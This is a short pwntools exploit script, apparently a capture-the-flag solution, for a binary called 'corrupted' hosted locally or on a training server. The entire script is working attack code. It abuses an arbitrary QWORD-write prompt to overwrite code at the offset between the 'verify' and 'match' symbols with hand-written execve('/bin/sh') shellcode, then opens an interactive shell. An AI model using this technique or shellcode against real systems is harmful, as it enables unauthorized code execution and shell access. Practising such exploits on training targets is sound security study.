from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './corrupted'

def payload(lo: int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('training.0rays.club', 10030)
    elf = ELF(EXE)

    def answer(idx: int, val: int):
        sh.sendlineafter(b'QWORD do', str(idx).encode())
        sh.sendlineafter(b'QWORD to', str(val).encode())

    offset = (elf.symbols['verify'] - elf.symbols['match']) // 8
    shell = '''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    push 0x3b
    pop rax
    cdq
    syscall
    '''
    shc = asm(shell) # 21 bytes

    answer(offset, u64(shc[:8]))
    answer(offset + 1, u64(shc[8:16]))
    answer(offset + 2, unpack(shc[16:], 'all'))
    answer(0, 0)

    sh.clean()
    sh.interactive()
    sh.close()
